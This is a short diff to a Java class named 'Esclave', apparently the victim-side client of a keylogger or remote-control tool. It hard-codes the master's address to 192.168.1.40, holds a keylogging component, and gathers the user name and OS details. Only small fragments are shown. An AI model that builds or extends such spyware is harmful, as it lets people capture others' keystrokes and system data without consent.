@@ -46,8 +46,8 @@ public class Esclave {
 	}
 
 	private InetAddress _addresse;
-	private final String _addresseMaitre = InetAddress.getLocalHost()
-			.getHostName(); // Addresse IP de la machine distante
+	private final String _addresseMaitre = "192.168.1.40" ;//InetAddress.getLocalHost()
+			//.getHostName(); // Addresse IP de la machine distante
 
 	private ObjectInputStream _in; // Flux d'entree
 	private Keylogging _klgg;
@@ -103,7 +103,7 @@ public class Esclave {
 
 			String fileseparator = System.getProperty("file.separator"), username = System // Initialise
 																							// les
-																							// proprietes
+																			// proprietes
 					.getProperty("user.name"), os_version = System // du système
 					// esclave
 					.getProperty("os.version"), os_name = System
